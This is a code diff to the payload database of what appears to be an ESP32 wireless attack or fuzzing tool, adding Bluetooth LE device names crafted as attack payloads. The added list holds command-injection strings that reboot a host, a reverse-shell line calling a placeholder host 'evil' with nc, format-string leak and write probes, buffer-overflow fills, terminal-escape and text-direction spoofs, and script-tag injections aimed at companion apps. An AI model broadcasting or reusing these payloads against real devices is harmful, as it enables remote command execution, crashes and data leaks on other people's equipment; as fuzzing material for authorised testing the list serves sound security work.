@@ -9,6 +9,7 @@ CREATE TABLE IF NOT EXISTS payloads (
     text        TEXT NOT NULL,
     category    TEXT NOT NULL DEFAULT 'custom',
     description TEXT NOT NULL DEFAULT '',
+    protocols   TEXT NOT NULL DEFAULT 'wifi',
     created_at  TEXT NOT NULL DEFAULT (datetime('now'))
 );
 
@@ -258,6 +259,63 @@ DEFAULT_PAYLOADS = [
 
 ]
 
+# =========================================================================
+# BLUETOOTH LE payloads (delivered as the BLE Complete Local Name AD field)
+# Practical Complete Local Name limit in a single legacy advertisement is
+# ~29 bytes (31-byte PDU minus 2 bytes of AD header). Longer payloads need
+# extended advertising on BLE 5 hardware. All payloads below stay within
+# the legacy limit so they fit on ESP32 out of the box.
+# =========================================================================
+BLE_PAYLOADS = [
+    # --- Command injection via BLE name (logged into shell-touching code) ---
+    ('|reboot|',                 'ble_cmd',      'Pipe command injection (BLE)'),
+    ('`reboot`',                 'ble_cmd',      'Backtick command substitution'),
+    ('$(reboot)',                'ble_cmd',      'Subshell command substitution'),
+    (';reboot;',                 'ble_cmd',      'Semicolon command separator'),
+    ('&reboot&',                 'ble_cmd',      'Ampersand command chain'),
+    ('$(busybox reboot)',        'ble_cmd',      'BusyBox subshell reboot'),
+    ('|nc evil 4444 -e sh|',     'ble_cmd',      'Reverse shell via pipe'),
+
+    # --- Format string in BLE name parsers / loggers ---
+    ('%s%s%s%s',                 'ble_fmt',      'String format crash'),
+    ('%n%n%n%n',                 'ble_fmt',      'Write format exploit'),
+    ('%x%x%x%x',                 'ble_fmt',      'Hex stack leak'),
+    ('AAAA%08x%08x',             'ble_fmt',      'Stack canary probe'),
+    ('%p%p%p%p',                 'ble_fmt',      'Pointer leak'),
+
+    # --- Boundary / fuzz inputs for BLE name buffers ---
+    ('A' * 29,                   'ble_overflow', '29-byte BLE name fill'),
+    ('A' * 28 + '\x00',          'ble_overflow', 'Null-terminated at boundary'),
+    ('\x7f' * 29,                'ble_overflow', 'DEL byte fill (29 bytes)'),
+    ('\x00' * 29,                'ble_overflow', 'All null bytes'),
+    ('A' * 14 + '\x00' * 15,     'ble_overflow', 'Half-null padded name'),
+    ('\xff' * 29,                'ble_overflow', '0xFF fill (high bit set)'),
+
+    # --- Probe: malformed / Unicode / control bytes in BLE name ---
+    ('\x1b]0;owned\x07',         'ble_probe',    'ANSI OSC terminal title set'),
+    ('‮diSS_derewop',       'ble_probe',    'RTL override display spoof'),
+    ('\xc0\x80\xc0\x80',         'ble_probe',    'Overlong null encoding'),
+    ('\r\nINJECTED\r\n',         'ble_probe',    'CRLF in name field'),
+
+    # --- XSS / serial (mobile companion apps that render BLE names) ---
+    ('<script>alert(1)</script>'[:29], 'ble_xss',  'Script tag in BLE name'),
+    ('<img src=x onerror=alert(1)>'[:29], 'ble_xss', 'Img onerror BLE name'),
+]
+
+
+def _flatten_payloads():
+    """Yield (text, category, description, protocols) for all seed payloads.
+
+    Existing WiFi rows are 3-tuples and default to 'wifi'. BLE rows are
+    explicitly tagged 'ble' so the firmware knows which radio to use.
+    """
+    for row in DEFAULT_PAYLOADS:
+        text, category, description = row
+        yield text, category, description, 'wifi'
+    for row in BLE_PAYLOADS:
+        text, category, description = row
+        yield text, category, description, 'ble'
+
 
 def get_db() -> sqlite3.Connection:
     conn = sqlite3.connect(str(DB_PATH))
@@ -277,10 +335,11 @@ def seed_default_payloads():
     conn = get_db()
     count = conn.execute("SELECT COUNT(*) FROM payloads").fetchone()[0]
     if count == 0:
-        for text, category, description in DEFAULT_PAYLOADS:
+        for text, category, description, protocols in _flatten_payloads():
             conn.execute(
-                "INSERT INTO payloads (text, category, description) VALUES (?, ?, ?)",
-                (text, category, description),
+                "INSERT INTO payloads (text, category, description, protocols) "
+                "VALUES (?, ?, ?, ?)",
+                (text, category, description, protocols),
             )
         conn.commit()
     conn.close()
